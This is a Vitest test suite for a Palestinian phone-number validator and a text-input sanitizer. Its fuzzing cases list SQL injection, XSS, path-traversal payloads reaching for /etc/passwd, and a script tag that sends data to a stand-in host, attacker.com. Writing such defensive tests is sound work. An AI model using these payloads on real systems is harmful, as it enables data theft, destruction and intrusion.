import { describe, it, expect } from 'vitest';
import { sanitizeAndValidatePalestinianPhone } from '@/core/validators/phone';
import { sanitizeTextInput } from '@/core/validators/sanitizer';

describe('Security Fuzzing & Input Sanitization Suite', () => {
  describe('Palestinian Phone Number Validator (Jawwal 059 & Ooredoo 056)', () => {
    it('should correctly normalize standard Palestinian phone numbers', () => {
      expect(sanitizeAndValidatePalestinianPhone('0599123456')).toBe('0599123456');
      expect(sanitizeAndValidatePalestinianPhone('0568987654')).toBe('0568987654');
      expect(sanitizeAndValidatePalestinianPhone('+970599123456')).toBe('0599123456');
      expect(sanitizeAndValidatePalestinianPhone('00972568987654')).toBe('0568987654');
      expect(sanitizeAndValidatePalestinianPhone(' 059-912-3456 ')).toBe('0599123456');
    });

    it('should reject malformed or foreign phone numbers', () => {
      expect(() => sanitizeAndValidatePalestinianPhone('0512345678')).toThrow('رقم هاتف فلسطيني غير صالح');
      expect(() => sanitizeAndValidatePalestinianPhone('059123')).toThrow('رقم هاتف فلسطيني غير صالح');
      expect(() => sanitizeAndValidatePalestinianPhone('+12025550123')).toThrow('رقم هاتف فلسطيني غير صالح');
    });

    it('Fuzzing: should block SQL Injection and Script payloads in phone field', () => {
      const maliciousPayloads = [
        "0599123456' OR '1'='1",
        '<script>alert("xss")</script>',
        '0599123456; DROP TABLE users;--',
        '../../etc/passwd',
      ];

      for (const payload of maliciousPayloads) {
        expect(() => sanitizeAndValidatePalestinianPhone(payload)).toThrow();
      }
    });
  });

  describe('Text Input Sanitizer (XSS & Injection Defense)', () => {
    it('should strip dangerous HTML and scripts from transaction notes', () => {
      const dirty = '<script>fetch("https://attacker.com/steal")</script>شراء طحين';
      const clean = sanitizeTextInput(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('شراء طحين');
    });

    it('should truncate excessively long notes to prevent buffer/memory attacks', () => {
      const hugeString = 'أ'.repeat(5000);
      const clean = sanitizeTextInput(hugeString, 100);
      expect(clean.length).toBeLessThanOrEqual(100);
    });
  });
});
